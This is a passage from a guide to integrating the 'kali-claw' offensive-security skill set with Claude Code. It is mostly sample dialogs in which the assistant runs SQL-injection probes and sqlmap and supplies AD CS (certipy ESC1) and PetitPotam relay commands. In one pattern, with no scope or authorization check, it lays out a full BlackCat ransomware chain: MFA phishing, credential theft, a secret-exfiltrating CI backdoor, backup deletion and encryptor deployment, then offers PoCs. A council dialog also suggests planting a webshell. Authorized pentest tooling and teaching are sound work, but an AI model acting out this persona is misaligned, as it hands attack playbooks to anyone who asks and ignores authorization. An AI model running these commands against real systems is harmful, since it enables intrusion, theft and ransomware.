          {
            "type": "command",
            "command": "echo \"[$(date)] Session ended\" >> memory/session-log.md"
          }
        ]
      }
    ]
  }
}
```

### 5.3 Integrate kali-claw Validation / Orchestration Scripts (v0.1.39 New Capability)

kali-claw's `validation/` directory provides 10+ Bash scripts that can be invoked directly through Claude Code's Bash tool — **the killer feature of kali-claw + Claude Code collaboration**:

```
You: Run orchestrator for a full pentest workflow, target 10.10.10.10

Claude: [Bash tool invocation]
        bash validation/orchestrator.sh --target 10.10.10.10 --phase full

        [reads output]
        Phase 1: recon-osint complete, found 3 subdomains
        Phase 2: nmap scan complete, 22/80/443 open
        Phase 3: ...

        Continue to post-exploitation phase?
```

```
You: Score web-sqli

Claude: [Bash]
        bash validation/SCORE.sh --skill web-sqli

        [Result]
        web-sqli total: 92.0
        - skill_md: 88
        - payloads_md: 95
        - test_cases_md: 92
        - guides: 92

        Analysis: payloads is the strongest, skill_md slightly weak (missing ## Defense Perspective section).
        Recommendation: append a Defense Perspective section to SKILL.md to push 94+.
```

```
You: Check workspace health

Claude: [Bash]
        bash validation/heartbeat.sh --json

        [parse JSON]
        Status: HEARTBEAT_OK
        - Core files intact ✓
        - skills/ has 111 entries ✓
        - memory/ has logs within the last 7 days ✓
        - Backup age < 24h ✓

        All good.
```

### 5.4 Project Structure After Complete Migration

```
kali-claw/                           <-- Project root
├── CLAUDE.md                        <-- Project instructions (Security Agent Mode appended)
├── .claude/
│   ├── settings.json                <-- Project-level config
│   └── settings.local.json          <-- Local overrides (git ignored)
├── .mcp.json                        <-- MCP server config (new)
├── .scope                           <-- Authorized scope file (new)
├── SOUL.md / IDENTITY.md / ...      <-- Unchanged
├── skills/                          <-- 111 skill domains (unchanged)
├── validation/                      <-- Scoring + orchestration scripts (unchanged)
├── memory/ / chronicle/ / docs/     <-- Unchanged
└── bak/

~/.claude/
├── settings.json                    <-- User-level config (API Key, model, permissions, Hooks)
├── credentials.json                 <-- OAuth token (auto)
├── agents/                          <-- Subagents
│   ├── web-sqli-analyzer.md
│   ├── network-scanner.md
│   ├── security-auditor.md
│   ├── pam-attacker.md
│   ├── supply-chain-attacker.md
│   └── ...
├── skills/                          <-- Skills symlinks (111)
│   ├── web-sqli -> /path/kali-claw/skills/web-sqli
│   └── ...
├── rules/
│   └── kali-claw-security.md
├── projects/
│   └── <hash>/
│       └── memory/
└── ...

~/kali-mcp-servers/                  <-- MCP servers (new)
├── nmap_server.py
├── sqlmap_server.py
└── remote_nmap_server.py

~/kali-hooks/                        <-- Hook scripts (new)
└── check-scope.sh
```

**Key observation:** The `skills/` directory and all files within it remain completely unchanged. Claude Code reads them in their original locations. The only modifications are: appending to `CLAUDE.md`, creating new files outside `skills/` (agents, rules, MCP servers, hooks), and creating `.mcp.json` and `.scope` in the project root.

---

## 6. kali-claw + Claude Code Detailed Collaboration Guide

> This section is new in v0.1.39. It answers a key question: **in daily use of kali-claw + Claude Code, how exactly do you work together?**

### 6.1 Seven Collaboration Patterns at a Glance

| Pattern | Scenario | Duration | Skills Involved |
|---------|----------|----------|-----------------|
| **A. Quick TTP lookup** | "What's the payload for XX vuln?" | 5-30 sec | One skill's payloads.md |
| **B. Single-skill engagement** | "Test this URL for SQL injection" | 5-15 min | One attack skill + terminal-ops |
| **C. Multi-skill kill chain** | "Walk through the BlackCat ransomware chain" | 30 min - 2 hr | 5-8 attack skills in series |
| **D. Full authorized pentest** | "Do a full pentest on this target and produce a report" | 2-4 hr | engagement-manager + 5-10 attack skills + pentest-reporting |
| **E. Learning / training** | "I want to learn AD CS attacks" | Ongoing | deep-research + target skill + verification-loop |
| **F. Cross-tool verification** | "Verify this finding with multiple methods" | 15-30 min | verification-loop + 2-3 independent skills |
| **G. Debugging / retrospective** | "Why didn't this payload work?" | 5-30 min | Target skill + search-first + codebase-onboarding |

### 6.2 Pattern A: Quick TTP Lookup (Most Common)

**Typical dialog:**

```
You: @skills/ad-cs-abuse/payloads.md What's the ESC1 attack payload?

Claude: [loads payloads.md]
        ESC1 (Client Authentication + Enrollee Supplies Subject + SAN) payload:

        1. Use certipy to find ESC1-vulnerable certificates:
           certipy find -u user@domain.local -p Pass -dc-ip DC01

        2. Exploit ESC1 to request a certificate (impersonating administrator):
           certipy req -u user@domain.local -p Pass -ca 'domain-CA'
              -template 'VulnTemplate' -upn administrator@domain.local

        3. Use the certificate to request a TGT:
           certipy auth -pfx administrator.pfx -dc-ip DC01

        4. Done: you are now administrator.
```

**Why use `@` references instead of "read xxx":** `@` is Claude Code's native file reference syntax — it auto-expands to a Read tool call, more reliable and more token-efficient than natural language.

### 6.3 Pattern B: Single-Skill Engagement

**Typical dialog (5-15 min complete flow):**

```
You: Test http://testphp.vulnweb.com/listproducts.php?cat=1 for SQL injection

Claude: [auto-matches web-sqli-analyzer subagent]
        [loads skills/web-sqli/SKILL.md methodology]

        I will execute the 5-step detection per kali-claw's SQL injection methodology:

        Step 1: Entry probe (single quote trigger)
        [Bash] curl -s -o /dev/null -w "%{http_code}\n" \
                "http://testphp.vulnweb.com/listproducts.php?cat=1"
        [Bash] curl -s -o /dev/null -w "%{http_code}\n" \
                "http://testphp.vulnweb.com/listproducts.php?cat=1'"
        → 200 vs 200 (error swallowed, need other methods)

        Step 2: Boolean comparison
        [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='1" | wc -l
        [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='2" | wc -l
        → 247 vs 14 lines (significant difference, confirm boolean blind)

        Step 3: sqlmap automated confirmation
        [Bash] sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" \
                 --batch --level=3 --risk=2 --dbs
        → Confirmed MySQL >= 5.6, 4 databases

        ✓ SQL injection confirmed (string-type, single-quote closure, Boolean-blind)
        CVSS estimate: 9.8 (Critical)
        Fix recommendation: replace string concatenation with PDO prepared statements

        Continue to data extraction?
```

**Collaboration highlights:**
- Claude auto-loads the subagent — you don't need to specify "which skill"
- Each step has actual Bash tool execution — not paper talk
- Auto-records in test-cases.md format, writes to `memory/2026-06-28.md`
- Ends with CVSS + fix recommendation, matching the article-writing skill's report format

### 6.4 Pattern C: Multi-Skill Kill Chain (v0.1.39 Killer Scenario)

**Typical dialog (30 min - 2 hr, covers 5-8 skills):**

```
You: Use kali-claw to walk through the complete BlackCat ransomware chain from initial access to encryption deployment

Claude: [loads engagement-manager + council skills for multi-skill orchestration]

        Based on Mandiant 2023 + CrowdStrike 2024 reports, BlackCat's typical path:

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 1: Initial Access (sase-sse-attack + email-security-deep) ║
        ╚══════════════════════════════════════════════════════════╝
        @skills/sase-sse-attack/payloads.md Zscaler ZIA bypass techniques...
        @skills/email-security-deep/payloads.md AiTM phishing (evilginx2)...

        Specific payloads (from payloads.md):
        - Use evilginx2 reverse proxy to steal MFA:
          evilginx2 -p custom_proxy
          # Configure phishing_hostname and target domain
        - Use Cobalt Strike through Zscaler ZIA egress (bypass SSL inspection)

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 2: Identity Penetration (cloud-identity-attack)      ║
        ╚══════════════════════════════════════════════════════════╝
        @skills/cloud-identity-attack/payloads.md Entra ID PRT theft...

        - Use ROADtools to grab Primary Refresh Token:
          roadrecon auth -u compromised@contoso.com -p Pass
          roadrecon gather
        - 7 techniques to bypass Conditional Access (from SKILL.md)

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 3: Credential Hub (pam-privilege-attack)             ║
        ╚══════════════════════════════════════════════════════════╝
        @skills/pam-privilege-attack/payloads.md CyberArk PVWA attack...

        - CVE-2025-32564 (PVWA auth bypass):
          # See skills/pam-privilege-attack/guides/cyberark.md for details
        - .cue cred file cracking:
          python3 cyberark_cue_decrypt.py vault.cue
        - Once you have Vault Admin: export all safes → all domain admin passwords

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 4: Lateral Movement (ad-cs-abuse + ad-ldap-attack)   ║
        ╚══════════════════════════════════════════════════════════╝
        @skills/ad-cs-abuse/payloads.md ESC1 + PetitPotam...
        @skills/ad-ldap-attack/payloads.md Kerberoasting + DCSync...

        - PetitPotam + NTLM Relay → AD CS:
          python3 PetitPotam.py -u user -p Pass attacker DC01$
        - ESC1 abuse: certipy req -template VulnTemplate -upn administrator
        - Pass-the-Hash + Kerberoasting: sweep all DCs

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 5: Defense Evasion (cspm-casb-attack)                ║
        ╚══════════════════════════════════════════════════════════╝
        @skills/cspm-casb-attack/payloads.md Wiz graph injection...

        - Tamper Terraform state to hide real config from Wiz
        - OPA Rego case-sensitivity trap to bypass Kyverno policy

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 6: Persistence (ci-cd-supply-chain-attack)           ║
        ╚══════════════════════════════════════════════════════════╝
        @skills/ci-cd-supply-chain-attack/payloads.md ...

        - Backdoor the Jenkins shared library
        - Modify GitHub Actions workflow to exfiltrate secrets
        - Use dependency confusion to plant a malicious npm package

        ╔══════════════════════════════════════════════════════════╗
        ║ Phase 7: Exfiltration + Encryption Deployment (storage-san)║
        ╚══════════════════════════════════════════════════════════╝
        @skills/storage-san-attack/payloads.md NetApp NDMP...

        - NetApp NDMP snapshot theft
        - Use stolen credentials to log into Dell EMC Unity and delete backups
        - Deploy BlackCat encryptor

        ══════════════════════════════════════════════════════════
        Summary: 7 phases / 7 skills / MITRE ATT&CK mapping:
        T1566 (Phishing) → T1078 (Valid Accounts) → T1552 (Credentials)
        → T1550 (Alternate Auth Material) → T1562 (Impair Defenses)
        → T1505 (Server Software Component) → T1486 (Data Encrypted)

        Want me to dive deeper into any phase with a PoC?
```

**Collaboration highlights:**
- Claude uses `@` to auto-load 7 skills' payloads.md, not speaking from memory
- Each phase provides concrete commands (extracted from real payloads.md)
- Auto-maps MITRE ATT&CK (this is the `metadata.mitre` field in kali-claw SKILL.md frontmatter)
- This is the core value of kali-claw v0.1.39: weaving 7 independent skills into a coherent attack chain

### 6.5 Pattern D: Full Authorized Pentest (Highest-Intensity Collaboration)

**Typical dialog (2-4 hr):**

```
You: Authorized scope is in the .scope file. Target 10.10.10.10. Do a full black-box pentest and produce a report.

Claude: [loads engagement-manager subagent]
        [reads .scope]
        [loads safety-guard skill]

        Confirming authorized scope:
        - Target: 10.10.10.10 (in scope)
        - Time window: 2026-06-28 09:00 - 18:00
        - Test type: black-box, no credentials
        - Excluded: DoS, social engineering, physical intrusion

        I will execute per PTES + OWASP流程:

        ═══ Phase 1: Reconnaissance (30 min) ═══
        [loads recon-osint + osint + deep-research]
        [Bash] bash validation/orchestrator.sh --target 10.10.10.10 --phase recon

        ... (executing, prompting confirmation at each step)

        ═══ Phase 2: Scanning (30 min) ═══
        [loads network-pentest]
        [Bash] nmap -sV -sC -p- 10.10.10.10
        [MCP] kali-nmap nmap_scan target=10.10.10.10 scan_type=-A ports=1-65535

        ...

        ═══ Phase 3: Exploitation (1 hr) ═══
        Found 22 (SSH), 80 (HTTP), 443 (HTTPS), 8080 (Jenkins)
        [loads ci-cd-supply-chain-attack]
        [Bash] curl -s http://10.10.10.10:8080/jenkins/
        → Jenkins 2.441 (CVE-2024-23897 args4j arbitrary file read)

        ... (exploitation chain unfolds)

        ═══ Phase 4: Post-Exploitation (30 min) ═══
        [loads post-exploitation + privilege-escalation]
        ...

        ═══ Phase 5: Report Generation (30 min) ═══
        [loads pentest-reporting + article-writing]
        [Bash] bash validation/report-generator.sh \
                 --source memory/2026-06-28.md \
                 --format markdown \
                 --output reports/2026-06-28-10.10.10.10.md

        Report generated: reports/2026-06-28-10.10.10.10.md (12 pages)
        - Executive summary: 3 high, 2 medium, 4 low
        - Attack chain visualization: 5 independent paths, longest 6 steps to Domain Admin
        - Fix priority: patch CVE-2024-23897 first (Critical)

        Also recorded to chronicle/2026/06/28-10.10.10.10.md.
```

**Collaboration highlights:**
- `engagement-manager` is the top-level coordinator, triggering other skills per PTES
- `safety-guard` checks `.scope` before each tool invocation
- `validation/orchestrator.sh` is the Bash landing — combining orchestration scripts with Claude's intelligence
- Reports auto-written to `reports/` and `chronicle/`

### 6.6 Pattern E: Learning / Training

```
You: I want to learn AD CS attacks, from intro to practical

Claude: [loads deep-research + ad-cs-abuse]
        [reads skills/ad-cs-abuse/SKILL.md + guides/]

        Based on kali-claw's ad-cs-abuse skill, here's a 5-day learning plan:

        Day 1: Theory Foundations
        - Read skills/ad-cs-abuse/SKILL.md (understand certificate templates, CA types)
        - Read guides/cert-templates-deep-dive.md
        - Key concepts: ENROLLEE_SUPPLIES_SUBJECT, CLIENT_AUTHENTICATION, SAN

        Day 2: ESC1-ESC4 (Configuration Errors)
        - Use certipy to find vulnerable certificate templates in the lab
        - Hands-on: certipy find -u user@lab.local -p Pass -dc-ip DC01 -vulnerable

        Day 3: ESC5-ESC8 (Deeper Errors)
        - NTLM Relay to AD CS HTTP Endpoints (ESC8)
        - PetitPotam + NTLM Relay chain

        Day 4: CVE Reproduction
        - Certifried (CVE-2022-26923): full reproduction with certipy
        - PKINIT troubleshooting

        Day 5: Detection and Defense
        - Read the Defense Perspective section of SKILL.md
        - Deploy 10 KQL/SPL/Sigma detection rules (from guides/detection-rules.md)

        Lab environment recommendation:
        docker run -d -p 389:389 --name lab-dc lab.local/dc:latest
        # Or use the GOAD (Game Of Active Directory) project

        Want me to set up the lab for you first?
```

### 6.7 Pattern F: Cross-Tool Verification (verification-loop)

```
You: I just found SQL injection with sqlmap, but the customer says it doesn't reproduce. Help me verify independently.

Claude: [loads verification-loop skill]
        [reads skills/verification-loop/SKILL.md 4-stage flow]

        Independent verification flow:

        Verification 1: Manual curl (no sqlmap dependency)
        [Bash] curl -s "http://target/page?id=1' UNION SELECT database(),version(),user()-- -"
        → Output contains DB name, version, username → Confirmed

        Verification 2: Burp Suite Repeater (different HTTP client)
        - I'll provide the full Burp request, you send it in Burp
        - This verifies it's not a curl/sqlmap client-specific quirk

        Verification 3: Time-based blind independent confirmation
        [Bash] time curl -s "http://target/page?id=1' AND SLEEP(5)-- -"
        → Response time 5.0+ sec → Independent confirmation

        Verification 4: Error log cross-reference
        [Bash] (if log access) grep -i "sql" /var/log/mysql/error.log

        ✓ 4 independent methods all confirm SQL injection exists
        ✓ No reliance on any single tool

        Writing verification report: memory/2026-06-28-sqli-verification.md
```

### 6.8 Pattern G: Debugging / Retrospective

```
You: I ran ESC1 with certipy, but it failed. Log says "certificate request denied".

Claude: [loads search-first + ad-cs-abuse]
        [reads skills/ad-cs-abuse/guides/troubleshooting.md]

        Common ESC1 failure causes (by frequency):

        1. Certificate template requires CA Manager approval (Pending mode)
           Check: certutil -view -restrict "Request Disposition=Pending"
           Fix: switch to another ESC1 template that doesn't require approval

        2. Target user lacks Enroll permission
           Check: certutil -view -restrict "Template=<TemplateName>"
           Fix: use PKI Health Check tool to find permission config

        3. CA service unreachable (RPC ports blocked by firewall)
           Check: nc -z DC01 135 && nc -z DC01 49152-65535
           Fix: open RPC ports

        4. Certificate template isn't actually ESC1 (misidentified)
           Check: certipy template -u user -p Pass -template <name> -save
           Fix: re-run certipy find -vulnerable to confirm

        Please paste the full command and error, I'll pinpoint it.
```

### 6.9 Collaboration Best Practices

**DO:**

- **Use `@` for file references** instead of "read xxx file" — more reliable, more token-efficient
- **Open Plan Mode first for complex tasks** (Shift+Tab) — let Claude list a plan, confirm, then execute
- **Use `/compact` for long sessions** — intelligently compresses history to avoid context overflow
- **`/memory add` right after writing a finding** — let Claude record to `MEMORY.md`
- **Use `--max-turns 50` for long tasks** — prevent Claude from stopping midway
- **Use `/agents` to manage subagents** — periodically clean up outdated ones

**DON'T:**

- **Don't write payloads from memory** — let Claude pull from payloads.md to avoid hallucinations
- **Don't let Claude skip safety-guard** — scope check is a safety gate by design
- **Don't accept file writes without reviewing the diff** — use Shift+Tab to enter Plan Mode to see changes
- **Don't write real credentials in memory files** — explicitly forbidden by kali-claw rules
- **Don't build all 111 skills as subagents** — pick 5-10 high-frequency ones

---

## 7. Usage Scenarios

### 7.1 Full Penetration Testing Workflow

(See §6.5 Pattern D for the complete example)

### 7.2 Security Audit

```
You: Use the security-auditor agent to perform an OWASP audit on http://testphp.vulnweb.com

Claude: [loads security-auditor subagent]
        [reads skills/security-review/SKILL.md]
        Auditing per OWASP Top 10:

        A01 - Broken Access Control
        [check] Found IDOR — unauth access to other users' data

        A02 - Cryptographic Failures
        [check] HTTP not redirecting to HTTPS

        A03 - Injection
        [check] Found SQL injection and XSS

        A05 - Security Misconfiguration
        [check] Default config, error messages expose stack traces

        A07 - Auth Failures
        [check] No rate limiting on login — brute-forceable

        Overall rating: High risk
        Priority fixes: A03 Injection + A01 Access Control
```

### 7.3 Learning and Research

(See §6.6 Pattern E)

### 7.4 Council Multi-Perspective Analysis

```
You: Use council mode to analyze the SQL injection we found

Claude: [loads skills/council/SKILL.md]
        Launching Council multi-perspective analysis:

        [Attacker Perspective]
        - Can achieve full DB control via SQL injection
        - May achieve RCE through FILE privileges
        - Suggested tests: write webshell, read /etc/passwd

        [Defender Perspective]
        - Root cause: no parameterized queries
        - Fix: prepared statements + WAF
        - Detection: monitor abnormal SQL patterns

        [Auditor Perspective]
        - CVSS: 9.8 (Critical)
        - Compliance impact: violates OWASP A03, PCI-DSS 6.5
        - Need full written attack chain documentation

        Consensus: fix immediately, and check other pages for the same class.
```

### 7.5 Report Generation

```
You: Help me generate a security report for all findings today

Claude: [loads skills/article-writing/SKILL.md]
        Generating per article-writing methodology:

        ## Security Assessment Report

        ### Metadata
        - Assessment date: 2026-06-28
        - Target: target.com
        - Methodology: OWASP Top 10 + PTES

        ### Findings Summary
        | ID | Title | CVSS | Status |
        |----|-------|------|--------|
        | V-001 | SQL Injection | 9.8 | Open |
        | V-002 | XSS (Reflected) | 6.1 | Open |
        | V-003 | IDOR | 5.3 | Open |

        ### Detailed Findings
        [For each vuln: description, reproduction, evidence, impact, remediation]

        [Report written to memory/2026-06-28-report.md]
```

---

## 8. FAQ

### Q1: Can Claude Code run on Kali Linux?

Yes. Kali Linux is Debian-based; all three methods work:

```bash
# Method 1: Native installer (recommended)
curl -fsSL https://claude.ai/install.sh | bash

# Method 2: npm (requires Node.js >= 18)
sudo apt install -y nodejs npm
npm install -g @anthropic-ai/claude-code

# Method 3: nvm + npm
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
nvm install --lts
npm install -g @anthropic-ai/claude-code

# Verify
claude --version
```

### Q2: MCP server fails to connect

```bash
# 1. Check Python and MCP SDK
python3 --version
pip show mcp

# 2. Manually test the MCP server
python3 ~/kali-mcp-servers/nmap_server.py
# Should start without errors

# 3. Check .mcp.json paths (use absolute paths)
cat .mcp.json

# 4. View MCP status inside Claude
/mcp

# 5. Permissions
chmod +x ~/kali-mcp-servers/*.py
```

### Q3: Custom Subagent does not trigger

```bash
# 1. Check location
ls ~/.claude/agents/

# 2. Check frontmatter
head -8 ~/.claude/agents/web-sqli-analyzer.md
# Must start with --- and include name + description

# 3. View in-session
/agents

# 4. Description must be descriptive enough (Claude matches by description)
# Bad:  description: A security tool
# Good: description: SQL injection specialist. Covers Union/Blind/Time-based/Error-based. Use PROACTIVELY for any SQLi task.
```

### Q4: How do I keep the kali-claw project updated

```bash
cd kali-claw
git pull origin main

# Skill symlinks see new content automatically, no rebuild needed
# Subagents reference file paths, content updates take effect immediately

# After pulling, run a quality scoring pass
bash validation/SCORE.sh
```

### Q5: Will Claude Code's memory be lost

No. Claude Code's memory is stored on disk in `~/.claude/projects/<hash>/memory/`. Even after closing Claude Code, the memory persists when you open the same project next time.

### Q6: How to use the Skills system

Since 2025 Claude Code natively supports the Skills directory. Three usage methods:

1. **Skills directory** (recommended): `~/.claude/skills/<name>/SKILL.md` auto-scanned
2. **Subagent**: convert high-frequency skills to subagents with tool permissions and operating procedures
3. **Manual reference**: `@skills/<name>/SKILL.md` directly in conversation

### Q7: Can I use both OpenClaw and Claude Code

Yes. Both share the same `skills/` directory:

- **OpenClaw** reads `SOUL.md` + `AGENTS.md` + `skills/` as a workspace
- **Claude Code** reads `CLAUDE.md` + `~/.claude/agents/` + `skills/` as a project

They do not conflict — just different runtimes. Choose based on scenario:

- **Heavy orchestration, multi-agent collaboration, autonomous loops** → OpenClaw (stronger workspace lifecycle management)
- **Daily development, IDE integration, native Claude capabilities** → Claude Code (better conversation experience and context)

### Q8: How to configure remote Kali

Three approaches:

1. **Direct SSH**: Claude Code uses the Bash tool to execute `ssh user@kali-host "nmap ..."`
2. **MCP remote mode**: MCP server invokes remote Kali tools via SSH (see §5.1)
3. **VS Code Remote**: VS Code Remote SSH connects to Kali, remote terminal runs Claude Code

### Q9: Do I need to modify kali-claw's skill files

**No.** This is a core design principle of this guide. All 111 skill domains under `skills/` remain completely unchanged. Claude Code reads them in place. Migration only involves:

- Appending to `CLAUDE.md` (project-level config, not a skill file)
- Creating new files in `~/.claude/agents/` that reference `skills/` paths
- Creating symlinks in `~/.claude/skills/`
- Creating rule files in `~/.claude/rules/`
- Creating MCP servers and Hook scripts

None of these steps touch any file under `skills/`.

### Q10: How to create Subagents for all 111 skills

**You don't need to build all of them.** Recommended strategy:

- **High-frequency skills as Subagents** (5-10): web-sqli, network-pentest, ad-cs-abuse, pam-privilege-attack, ci-cd-supply-chain-attack, cloud-identity-attack, kubernetes-attack, security-auditor
- **Others as Skills symlinks** (111 at once): via the batch symlink script in §4.2
- **Occasionally-used skills**: directly `@skills/<name>/SKILL.md` (minimal migration approach)

### Q11: Claude Code access is unstable from mainland China

- **Configure a proxy**: `export HTTPS_PROXY=http://your-proxy:port`
- **Use Bedrock / Vertex AI**: go through AWS / GCP, no direct Anthropic connection
- **Switch npm registry**: `npm config set registry https://registry.npmmirror.com` (affects npm package download only, not runtime)
- **Use an Anthropic API reverse proxy**: self-host a reverse proxy and point `ANTHROPIC_BASE_URL` to it

### Q12: How to integrate with kali-claw's SCORE.sh quality system

Claude Code invokes it directly via the Bash tool:

```bash
# Score a single skill
> Score web-sqli

Claude: [Bash]
        bash validation/SCORE.sh --skill web-sqli
        → 92.0 (Distinguished)

# Find the weakest skills
> List the 5 lowest-scoring skills

Claude: [Bash]
        bash validation/SCORE.sh | jq 'sort_by(.overall_score) | .[0:5]'
```

### Q13: What's the difference between Plan Mode and normal mode

In Plan Mode (Shift+Tab), Claude **reads but does not write**:
- Can read files, run read-only commands (grep, find, ls)
- Cannot Write / Edit / run destructive Bash
- Suitable for: reviewing a project before acting, producing implementation plans, checking whether Claude understands correctly

You must exit Plan Mode (via the ExitPlanMode tool) to execute changes.

### Q14: How to make Claude auto-load multiple skills (multi-skill orchestration)

Three approaches:

1. **engagement-manager subagent** (recommended): purpose-built for orchestration, triggers other skills per PTES
2. **council skill**: multi-perspective analysis that forces coverage of attacker / defender / auditor
3. **CLAUDE.md directives**: write "complex tasks must read skills/deep-research/SKILL.md first for planning" in project instructions

---

## 9. Architecture Comparison and Reference

### 9.1 Complete Mapping Table

| kali-claw (OpenClaw) | Claude Code | Migration Method |
|---------------------|------------|------------------|
| `SOUL.md` (personality) | `CLAUDE.md` | Append key content |
| `USER.md` (user info) | `CLAUDE.md` / `~/.claude/settings.json` | Manual configuration |
| `AGENTS.md` (session config) | `CLAUDE.md` + `~/.claude/rules/` | Extract rules |
| `skills/*/SKILL.md` | `~/.claude/skills/` (symlink) + `~/.claude/agents/` (high-frequency) | Symlink primary, subagent secondary |
| `skills/*/payloads.md` | Project files (subagent references) | Keep in place |
| `skills/*/test-cases.md` | Project files (subagent references) | Keep in place |
| `skills/*/guides/` | Project files | Keep in place |
| `MEMORY.md` | `~/.claude/projects/.../memory/` | Copy |
| `memory/*.md` | `~/.claude/projects/.../memory/` | Copy recent |
| `chronicle/` | Project files | Keep in place |
| `TOOLS.md` | Project files + MCP servers | Partial conversion |
| `HEARTBEAT.md` | `~/.claude/settings.json` Hooks | Manual configuration |
| `validation/SCORE.sh` | Bash tool direct invocation | Don't migrate, use directly |
| `validation/orchestrator.sh` | Bash tool direct invocation | Don't migrate, use directly |
| `validation/engagement-template/` | `.scope` file + engagement-manager | Partial conversion |
| 12 Hacker Laws | `~/.claude/rules/` | Extract as rules |

### 9.2 Migration Checklist

**Minimal migration** (5 minutes):

- [ ] Install Claude Code via native installer (`curl -fsSL https://claude.ai/install.sh | bash`)
- [ ] Complete authentication (OAuth or API Key)
- [ ] Clone the kali-claw project
- [ ] Launch `claude` in the project directory
- [ ] Verify `@CLAUDE.md` reads the project description

**Standard migration** (30 minutes):

- [ ] Complete §4.1: append Security Agent Mode to `CLAUDE.md`
- [ ] Complete §4.2: batch symlink 111 skills into `~/.claude/skills/`
- [ ] Complete §4.3: create 5-10 high-frequency subagents
- [ ] Complete §4.4: create `~/.claude/rules/kali-claw-security.md`
- [ ] Complete §4.5: configure `~/.claude/projects/<hash>/memory/`
- [ ] Verify `/skills` shows ~111 skills

**Complete migration** (2-3 hours):

- [ ] Complete all standard migration steps
- [ ] Complete §5.1: create MCP servers (nmap, sqlmap, optional remote)
- [ ] Complete §5.2: configure Hooks (PreToolUse + Stop)
- [ ] Complete §5.3: test `bash validation/SCORE.sh` and `bash validation/orchestrator.sh`
- [ ] Create `.scope` authorized scope file
- [ ] End-to-end test: full authorized pentest + report generation

### 9.3 Performance Comparison

| Metric | OpenClaw | Claude Code |
|--------|----------|-------------|
| First startup | Requires framework install + agent creation | Native installer + OAuth, within 5 minutes |
| Skill loading | All loaded at session start | Progressive disclosure (frontmatter → SKILL.md → details) |
| Tool invocation | Through terminal commands | Bash + MCP (structured I/O) |
| Context window | Limited by framework | Claude native (200K+ tokens, with Extended Thinking) |
| Multi-session | Multi-agent support | Multi-tab + `--resume` |
| Update maintenance | Sync framework and skills | `git pull` + `claude update` |
| IDE integration | None | VS Code / JetBrains native |
| Debugging | File-level logs | `/status` real-time tokens, Ctrl+O verbose mode |

---

_Built with Claude Code + kali-claw v0.1.39 (111 skill domains / 33 Distinguished / 100% Excellent+). For questions or feedback, please open an issue on GitHub._
